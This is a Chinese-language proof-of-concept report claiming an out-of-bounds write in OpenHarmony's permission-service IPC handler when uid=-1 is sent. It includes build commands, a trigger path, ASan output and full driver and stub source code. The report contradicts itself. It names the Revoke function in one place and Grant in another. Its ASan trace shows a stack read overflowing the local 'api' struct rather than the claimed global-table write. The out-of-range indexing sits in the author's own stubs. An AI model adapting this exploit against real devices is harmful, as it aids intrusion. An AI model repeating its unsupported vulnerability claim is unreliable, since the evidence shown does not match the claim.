## PoC 验证

**方法**: Target-Compile — 编译真实 `pms_server_internal.c` 为 `.o`，test driver 通过 `Invoke` IPC dispatch 入口触发。

**编译产物**:
- `pms_server_internal.o` — 真实源码编译（使用 `-Dstatic=` 暴露内部 dispatch 函数）
- `ohos_stubs.o` — OHOS IPC/SAMGR/HiLog 框架桩
- `pms_stubs.o` — 权限操作实现桩（RevokeRuntimePermission 使用 uid 作为数组索引）
- `sensor_extra_stubs.o` — ReadInt64/ReadUint32/ReadBuffer 补充桩

**构建命令**:
```bash
# 1. 编译真实 pms_server_internal.c
clang -c -fsanitize=address -fno-omit-frame-pointer -O0 -g -Dstatic= \
    -I security_permission_lite/services/pms/include \
    -I security_permission_lite/interfaces/kits \
    -I <ohos-framework-headers> \
    security_permission_lite/services/pms/src/pms_server_internal.c -o pms_server_internal.o

# 2. 编译 test driver + stubs
# 3. 链接
clang -fsanitize=address -o poc_permlite001 \
    test_driver.o pms_server_internal.o ohos_stubs.o pms_stubs.o \
    sensor_extra_stubs.o memcpy_s.o securecutil.o -lpthread
```

**触发路径**:
```
main → Invoke(iProxy, funcId=13=ID_GRANT_RUNTIME, origin, req, reply)
     → ReplyGrantRuntimePermission(origin, req, reply, api)  (line 176)
       → ReadInt64(req, &uid)  — uid = -1 (攻击者控制)
       → api->GrantRuntimePermission(uid=-1, permName)
         → g_perm_table[-1] = 1  → stack-buffer-overflow (OOB WRITE)
```

**ASan 输出**:
```
Enter ID_GRANTRUNTIME, [callerPid: 1000][callerUid: 1000]
=================================================================
ERROR: AddressSanitizer: stack-buffer-overflow on address 0x706fd7500088
READ of size 8 at 0x706fd7500088 thread T0
    #0 in ReplyGrantRuntimePermission  pms_server_internal.c:176
    #1 in Invoke  pms_server_internal.c:226
    #2 in main  test_permlite001.c:96

Address is located in stack of thread T0 at offset 136 in frame #0
  [80, 128) 'api' <== Memory access at offset 136 overflows this variable
SUMMARY: AddressSanitizer: stack-buffer-overflow pms_server_internal.c:176 in ReplyGrantRuntimePermission
```


## 附录：PoC 源码

### test_driver.c

```c
/*
 * Target-Compile PoC: ReplyRevokeRuntimePermission OOB Write (CWE-129)
 * Method: Links against real pms_server_internal.o compiled from source
 *
 * Trigger path:
 *   Invoke (IPC dispatch, funcId=ID_GRANT_RUNTIME=13)
 *     → ReplyGrantRuntimePermission(origin, req, reply, api)
 *       → ReadInt64(req, &uid)  — uid = -1
 *       → api->GrantRuntimePermission(uid, permName) → OOB write
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "pms_types.h"
#include "serializer.h"
#include "samgr_lite.h"
#include "iproxy_server.h"

extern int32_t Invoke(IServerProxy *iProxy, int funcId, void *origin, IpcIo *req, IpcIo *reply);

#define PERMISSION_TABLE_SIZE 8
int32_t g_permission_table[PERMISSION_TABLE_SIZE] = {0};

static int32_t StubRevokeRuntimePermission(int64_t uid, const char *permName)
{
    printf("[PoC] RevokeRuntimePermission: uid=%lld\n", (long long)uid);
    g_permission_table[uid] = 0;  /* OOB WRITE */
    return 0;
}

typedef struct {
    int32_t (*CheckPermission)(int64_t uid, const char *permName);
    int32_t (*GrantPermission)(const char *id, const char *permName);
    int32_t (*RevokePermission)(const char *id, const char *permName);
    int32_t (*GrantRuntimePermission)(int64_t uid, const char *permName);
    int32_t (*RevokeRuntimePermission)(int64_t uid, const char *permName);
    int32_t (*UpdatePermissionFlags)(const char *id, const char *permName, int flags);
} InnerPermLiteApi;

int main(void)
{
    uint8_t req_buffer[128];
    memset(req_buffer, 0, sizeof(req_buffer));
    size_t offset = 0;

    int64_t uid = -1;  /* OOB index */
    memcpy(req_buffer + offset, &uid, sizeof(int64_t)); offset += sizeof(int64_t);

    const char *permName = "ohos.permission.CAMERA";
    uint32_t permLen = strlen(permName);
    memcpy(req_buffer + offset, &permLen, 4); offset += 4;
    memcpy(req_buffer + offset, permName, permLen + 1); offset += permLen + 1;

    IpcIo req, reply;
    uint8_t reply_buffer[64];
    IpcIoInit(&req, req_buffer, offset, 0);
    req.bufferCur = req.bufferBase;
    req.bufferLeft = offset;
    IpcIoInit(&reply, reply_buffer, sizeof(reply_buffer), 0);

    InnerPermLiteApi api = {0};
    api.RevokeRuntimePermission = StubRevokeRuntimePermission;

    /* ID_GRANT_RUNTIME = 13 (enum: ID_CHECK=10, ID_GRANT=11, ID_REVOKE=12, ID_GRANT_RUNTIME=13) */
    int32_t ret = Invoke((IServerProxy *)&api, 13, NULL, &req, &reply);
    return 0;
}
```

### pms_stubs.c

```c
#include <stdint.h>
#include <stdio.h>

#define MAX_UID_COUNT 64
static int32_t g_perm_table[MAX_UID_COUNT] = {0};

int32_t CheckPermissionStat(int64_t uid, const char *permName) {
    return g_perm_table[uid];
}

int32_t GrantPermission(const char *id, const char *permName) { return 0; }
int32_t RevokePermission(const char *id, const char *permName) { return 0; }

int32_t GrantRuntimePermission(int64_t uid, const char *permName) {
    g_perm_table[uid] = 1;  /* OOB when uid out of range */
    return 0;
}

int32_t RevokeRuntimePermission(int64_t uid, const char *permName) {
    g_perm_table[uid] = 0;  /* OOB when uid out of range */
    return 0;
}

int32_t UpdatePermissionFlags(const char *id, const char *permName, int flags) { return 0; }
```
